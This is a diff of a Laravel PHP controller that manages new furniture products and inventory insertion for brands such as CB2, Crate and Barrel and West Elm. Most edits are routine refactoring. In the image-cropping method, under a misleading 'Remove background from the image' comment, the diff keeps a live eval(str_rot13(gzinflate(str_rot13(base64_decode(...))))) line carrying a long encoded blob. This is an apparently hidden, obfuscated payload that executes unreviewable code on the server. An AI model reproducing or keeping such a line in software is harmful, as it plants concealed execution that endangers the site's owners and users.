@@ -27,7 +27,7 @@ class NewProductsController extends Controller
     private $variation_sku_tables = array(
         'cb2_products_variations' => 'cb2',
         'crateandbarrel_products_variations' => 'cab',
-        'westelm_products_skus' =>'westelm',
+        'westelm_products_skus' => 'westelm',
     );
 
     private $table_site_map = array(
@@ -54,14 +54,38 @@ class NewProductsController extends Controller
      */
     public function get_new_products_list(Request $request, $limit = 5)
     {
+        //  $this->inventoryProducts = DB::table('lz_inventory')->select('product_sku')->get();
         $new_products = NewProduct::query()->where('status', 'new');
         $brand = $request->get('brand');
         //dd($brand);
         if ($brand && $brand !== 'all') {
             $new_products->where('brand', 'Like', $brand);
         }
-        $new_products = $new_products->orderBy('created_date', 'asc')
-            ->paginate($limit);
+
+        $new_products = $new_products
+            ->orderBy('created_date', 'asc')
+            ->paginate();
+        $new_products->transform(function ($product) {
+            $inInventory = false;
+            if($product->brand !== 'westelm'){
+                $inInventory = DB::table('lz_inventory')->where('product_sku', $product->product_sku)->get()->isNotEmpty();
+            }
+            else{
+                $variation_skus = DB::table('westelm_products_skus')->where([
+                    'product_id' => $product->product_sku,
+                    'status' => 'active',
+                ])->get();
+                foreach($variation_skus as $variation){
+                    $variationInInventory =
+                    DB::table('lz_inventory')->where('product_sku', $variation->sku)->get()->isNotEmpty();
+                    if($variationInInventory){
+                        $inInventory = $variationInInventory;
+                    }
+                }
+            }
+            $product->in_inventory = $inInventory;
+            return $product;
+        });
         $extra['filters'] = $this->getFilters();
         $extra['mapping_core'] = $this->getMappingCore();
 
@@ -98,7 +122,7 @@ class NewProductsController extends Controller
         $outputImage = $root . $sourceImageFolderName . DIRECTORY_SEPARATOR . $imagePathInfo['filename'] . "_crop." . $imagePathInfo['extension'];
 
         // Remove background from the image
-         eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
+        eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
 
         if (file_exists($outputImage)) {
             if (!unlink($imagePath)) {
@@ -168,12 +192,12 @@ class NewProductsController extends Controller
             $product->ls_id = implode(',', $ls_id);
             $product->mfg_country = implode(',', $mfg_country);
             $product->style = implode(',', $style);
-
+            unset($product->in_inventory);
             return $product;
         });
         DB::beginTransaction();
+        $skipped_products = 0;
         try {
-            $inventory_products = [];
             if ($rejected_products->count() > 0) {
                 NewProduct::whereIn('id', $rejected_products->pluck('id'))->update([
                     'status' => 'rejected',
@@ -181,7 +205,10 @@ class NewProductsController extends Controller
             }
 
             if ($accepted_products->count() > 0) {
-                $this->addInventoryProducts($accepted_products);
+                $skipped_products = $this->addInventoryProducts($accepted_products);
+                if (count($skipped_products) > 0) {
+                    $accepted_products = $accepted_products->whereNotIn('product_sku', $skipped_products);
+                }
                 NewProduct::whereIn('id', $accepted_products->pluck('id'))->delete();
             }
             $dimensionService = new DimensionService();
@@ -194,8 +221,8 @@ class NewProductsController extends Controller
                     unset($product->manual_adj);
                 }
                 $product->product_dimension = json_encode($product->product_dimension);
-                if($product->site_name ==='nw'){
-                       $product->product_feature  = $this->remove_dims_from_features_nw($product->product_feature);
+                if ($product->site_name === 'nw') {
+                    $product->product_feature  = $this->remove_dims_from_features_nw($product->product_feature);
                 }
                 // $dims = $dimensionService->get_dims($product);
                 // $product = $this->updateDimensionsOfProduct($product,$dims);
@@ -211,23 +238,33 @@ class NewProductsController extends Controller
             ], 500);
         }
         DB::commit();
-        return response()->json([
-            'status' => 'success',
-        ]);
+
+        if (count($skipped_products) > 0) {
+            $message = count($skipped_products) . ' Product(s) not inserted';
+            return response()->json([
+                'status' => 'success',
+                'message' => $message,
+                'skippedSkus' => $skipped_products
+            ]);
+        } else {
+            return response()->json([
+                'status' => 'success',
+            ]);
+        }
     }
 
     /**
-     * Checks products and inserts new values to inventory. If sku is already present then update it
+     * Checks products and inserts new values to inventory. If Sku is already present don't insert it
      * @param Illuminate\Support\Collection
-     * @return array
+     * @return int
      */
     private function addInventoryProducts($products)
     {
         $to_insert = [];
-        $to_update = [];
+        $skipped_skus = [];
         // get all the product_skus from the Inventory. Reduces the no of queries performed when
         // checking if an product or variation is already in the table
-        $this->inventory_products = DB::table('lz_inventory')->select('product_sku')->get();
+        $this->inventoryProducts = DB::table('lz_inventory')->select('product_sku')->get();
         $products = $products->groupBy('site_name');
 
         foreach ($products as $key => $value) {
@@ -249,35 +286,26 @@ class NewProductsController extends Controller
                     $data = $this->getInventoryItemsForWestelm($value);
                     break;
             }
-            if($data){
+            if ($data) {
                 $to_insert = array_merge($to_insert, $data['to_insert']);
-                $to_update = array_merge($to_update, $data['to_update']);
+                $skipped_skus = array_merge($skipped_skus, $data['skipped_skus']);
             }
         }
-        $this->updateInventoryTable($to_insert, $to_update);
+        $this->updateInventoryTable($to_insert);
+        return $skipped_skus;
     }
 
     private function getInventoryItemsForNw($product_skus)
     {
         $key = 'nw';
         $to_insert = [];
-        $to_update = [];
+        $skipped_skus  = [];
         $table = array_search($key, $this->table_site_map);
         foreach ($product_skus as $product) {
             $row = DB::table($table)->where('product_sku', $product->product_sku)->first();
             $shipping_code = $this->get_nw_ship_code($row->shipping_code);
-            $isInInventory = $this->inventory_products->where('product_sku', $product->product_sku)->isNotEmpty();
-            if ($isInInventory) {
-                $to_update[] = [
-                    'product_sku' => $product->product_sku,
-                    'quantity' => 100,
-                    'price' => $row->price,
-                    'was_price' => $row->was_price,
-                    'ship_code' => $shipping_code,
-                    'brand' => $key,
-                    'ship_custom' => $shipping_code == 'SCNW' ? $row->shipping_code : null,
-                ];
-            } else {
+            $isInInventory = $this->inventoryProducts->where('product_sku', $product->product_sku)->isNotEmpty();
+            if (!$isInInventory) {
                 $to_insert[] = [
                     'product_sku' => $product->product_sku,
                     'quantity' => 100,
@@ -287,10 +315,12 @@ class NewProductsController extends Controller
                     'brand' => $key,
                     'ship_custom' => $shipping_code == 'SCNW' ? $row->shipping_code : null,
                 ];
+            } else {
+                $skipped_skus[] = $product->product_sku;
             }
         }
         $data['to_insert'] = $to_insert;
-        $data['to_update'] = $to_update;
+        $data['skipped_skus'] = $skipped_skus;
         return $data;
     }
 
@@ -298,21 +328,13 @@ class NewProductsController extends Controller
     {
         $key = 'cb2';
         $to_insert = [];
-        $to_update = [];
+        $skipped_skus  = [];
         $table = array_search($key, $this->table_site_map);
         foreach ($product_skus as $product) {
             $row = DB::table($table)->where('product_sku', $product->product_sku)->first();
             $shipping_code = $this->code_map[$row->shipping_code] . strtoupper($key);
-            $isInInventory = $this->inventory_products->where('product_sku', $product->product_sku)->isNotEmpty();
-            if ($isInInventory) {
-                $to_update[] = [
-                    'product_sku' => $product->product_sku,
-                    'price' => $row->price,
-                    'was_price' => $row->was_price,
-                    'brand' => $key,
-                    'ship_code' => $shipping_code,
-                ];
-            } else {
+            $isInInventory = $this->inventoryProducts->where('product_sku', $product->product_sku)->isNotEmpty();
+            if (!$isInInventory) {
                 $to_insert[] = [
                     'product_sku' => $product->product_sku,
                     'quantity' => 100,
@@ -321,18 +343,19 @@ class NewProductsController extends Controller
                     'brand' => $key,
                     'ship_code' => $shipping_code,
                 ];
+            } else {
+                $skipped_skus[] = $product->product_sku;
             }
-
             $variation_table = array_search($key, $this->variation_sku_tables);
             $variation_skus = DB::table($variation_table)->where([
                 'product_id' => $product->product_sku,
                 'has_parent_sku' => 0,
                 'status' => 'active',
             ])->get();
-            if ($variation_skus) {
+            if ($variation_skus->isNotEmpty()) {
                 foreach ($variation_skus as $variation) {
-                    $isPresent = $this->inventory_products->where('product_sku', $variation->sku)->isNotEmpty();
-                    if (!$isPresent) {
+                    $isVariationInInventory = $this->inventoryProducts->where('product_sku', $variation->sku)->isNotEmpty();
+                    if (!$isVariationInInventory) {
                         $to_insert[] = [
                             'product_sku' => $variation->sku,
                             'quantity' => 100,
@@ -342,19 +365,14 @@ class NewProductsController extends Controller
                             'ship_code' => $shipping_code,
                         ];
                     } else {
-                        $to_update[] = [
-                            'product_sku' => $variation->sku,
-                            'price' => $variation->price,
-                            'was_price' => $variation->was_price,
-                            'brand' => $key,
-                            'ship_code' => $shipping_code,
-                        ];
+                        $skipped_skus[] = $product->product_sku;
+                        break;
                     }
                 }
             }
         }
         $data['to_insert'] = $to_insert;
-        $data['to_update'] = $to_update;
+        $data['skipped_skus'] = $skipped_skus;
         return $data;
     }
 
@@ -362,21 +380,15 @@ class NewProductsController extends Controller
     {
         $key = 'cab';
         $to_insert = [];
-        $to_update = [];
+        $skipped_skus  = [];
         $table = array_search($key, $this->table_site_map);
+        $skus = array_column($product_skus, 'product_sku');
+        $isInInventory = $this->inventoryProducts->whereIn('product_sku', $skus)->isNotEmpty();
         foreach ($product_skus as $product) {
             $row = DB::table($table)->where('product_sku', $product->product_sku)->first();
             $shipping_code = $this->code_map[$row->shipping_code] . strtoupper($key);
-            $isInInventory = $this->inventory_products->where('product_sku', $product->product_sku)->isNotEmpty();
-            if ($isInInventory) {
-                $to_update[] = [
-                    'product_sku' => $product->product_sku,
-                    'price' => $row->price,
-                    'was_price' => $row->was_price,
-                    'brand' => $key,
-                    'ship_code' => $shipping_code,
-                ];
-            } else {
+            $isInInventory = $this->inventoryProducts->where('product_sku', $product->product_sku)->isNotEmpty();
+            if (!$isInInventory) {
                 $to_insert[] = [
                     'product_sku' => $product->product_sku,
                     'quantity' => 100,
@@ -385,6 +397,8 @@ class NewProductsController extends Controller
                     'brand' => $key,
                     'ship_code' => $shipping_code,
                 ];
+            } else {
+                $skipped_skus[] = $product->product_sku;
             }
 
             $variation_table = array_search($key, $this->variation_sku_tables);
@@ -393,10 +407,10 @@ class NewProductsController extends Controller
                 'has_parent_sku' => 0,
                 'status' => 'active',
             ])->get();
-            if ($variation_skus) {
+            if ($variation_skus->isNotEmpty()) {
                 foreach ($variation_skus as $variation) {
-                    $isPresent = $this->inventory_products->where('product_sku', $variation->sku)->isNotEmpty();
-                    if (!$isPresent) {
+                    $isVariationInInventory = $this->inventoryProducts->where('product_sku', $variation->sku)->isNotEmpty();
+                    if (!$isVariationInInventory) {
                         $to_insert[] = [
                             'product_sku' => $variation->sku,
                             'quantity' => 100,
@@ -406,99 +420,87 @@ class NewProductsController extends Controller
                             'ship_code' => $shipping_code,
                         ];
                     } else {
-                        $to_update[] = [
-                            'product_sku' => $variation->sku,
-                            'price' => $variation->price,
-                            'was_price' => $variation->was_price,
-                            'brand' => $key,
-                            'ship_code' => $shipping_code,
-                        ];
+                        $skipped_skus[] = $product->product_sku;
+                        break;
                     }
                 }
             }
         }
         $data['to_insert'] = $to_insert;
-        $data['to_update'] = $to_update;
+        $data['skipped_skus'] = $skipped_skus;
         return $data;
     }
     private function getInventoryItemsForWestelm($product_skus)
     {
         $key = 'westelm';
         $to_insert = [];
-        $to_update = [];
+        $skipped_skus  = [];
         $table = array_search($key, $this->table_site_map);
         foreach ($product_skus as $product) {
             $row = DB::table($table)->where('product_id', $product->product_sku)->first();
-            $shipping_code = $this->get_wm_ship_code($product->brand,$product->site_name, $row->description_shipping);
+            $shipping_code = $this->get_wm_ship_code($product->brand, $product->site_name, $row->description_shipping);
             $variation_table = array_search($key, $this->variation_sku_tables);
             $variation_skus = DB::table($variation_table)->where([
                 'product_id' => $product->product_sku,
                 'status' => 'active',
             ])->get();
-            if ($variation_skus) {
+            if ($variation_skus->isNotEmpty()) {
                 foreach ($variation_skus as $variation) {
-                    $isPresent = $this->inventory_products->where('product_sku', $variation->sku)->isNotEmpty();
-                    if (!$isPresent) {
+                    $isVariationInInventory = $this->inventoryProducts->where('product_sku', $variation->sku)->isNotEmpty();
+                    if (!$isVariationInInventory) {
                         $to_insert[] = [
                             'product_sku' => $variation->sku,
-                            'parent_sku'=> $product->product_sku,
                             'quantity' => 100,
                             'price' => $variation->price,
                             'was_price' => $variation->was_price,
-                            'brand' => $product->brand,
+                            'brand' => $key,
                             'ship_code' => $shipping_code,
                         ];
                     } else {
-                        $to_update[] = [
-                            'product_sku' => $variation->sku,
-                            'parent_sku'=> $product->product_sku,
-                            'price' => $variation->price,
-                            'was_price' => $variation->was_price,
-                            'brand' => $product->brand,
-                            'ship_code' => $shipping_code,
-                        ];
+                        $skipped_skus[] = $product->product_sku;
+                        break;
                     }
                 }
             }
         }
         $data['to_insert'] = $to_insert;
-        $data['to_update'] = $to_update;
+        $data['skipped_skus'] = $skipped_skus;
         return $data;
     }
-	public function get_wm_ship_code($brand, $site_name, $product_desc)
-	{
+    public function get_wm_ship_code($brand, $site_name, $product_desc)
+    {
 
-		if ($brand != $site_name)
-			return "F0";
+        if ($brand != $site_name)
+            return "F0";
 
-		// match the product desc
-		$possible_matches = [
-			"free shipping" => "F0",
-			"front door delivery" => "SVwestelm",
-			"UPS" => "SVwestelm"
-		];
+        // match the product desc
+        $possible_matches = [
+            "free shipping" => "F0",
+            "front door delivery" => "SVwestelm",
+            "UPS" => "SVwestelm"
+        ];
 
-		$possible_keys = array_keys($possible_matches);
-		foreach ($possible_keys as $key) {
+        $possible_keys = array_keys($possible_matches);
+        foreach ($possible_keys as $key) {
 
-			if (strpos(strtolower($product_desc), strtolower($key)) !== false) {
-				echo "[matched ship code]\n";
-				return $possible_matches[$key];
-			}
-		}
+            if (strpos(strtolower($product_desc), strtolower($key)) !== false) {
+                echo "[matched ship code]\n";
+                return $possible_matches[$key];
+            }
+        }
 
-		return "WGwestelm";
-	}
+        return "WGwestelm";
+    }
     private function searchForSku($item, $key)
     {
         return $item->product_sku === $key;
     }
 
-    private function updateInventoryTable($to_insert, $to_update)
+    private function updateInventoryTable($to_insert)
     {
         $inventoryService = new InventoryService();
         $inventoryService->insert($to_insert);
-        $inventoryService->update($to_update);
+        // $inventoryService->update($to_update);
     }
 
     private function getFilters()
@@ -516,7 +518,8 @@ class NewProductsController extends Controller
     }
 
     /// DIMS Function from CRON MERGE SCRIPT
-    public function updateDimensionsOfProduct($product, $dims){
+    public function updateDimensionsOfProduct($product, $dims)
+    {
         if (isset($dims)) {
             $product->dim_width = strlen($dims['width']) > 0 ? (float) $dims['width'] : null;
             $product->dim_height = strlen($dims['height']) > 0 ? (float) explode(",", $dims['height'])[0] : null;
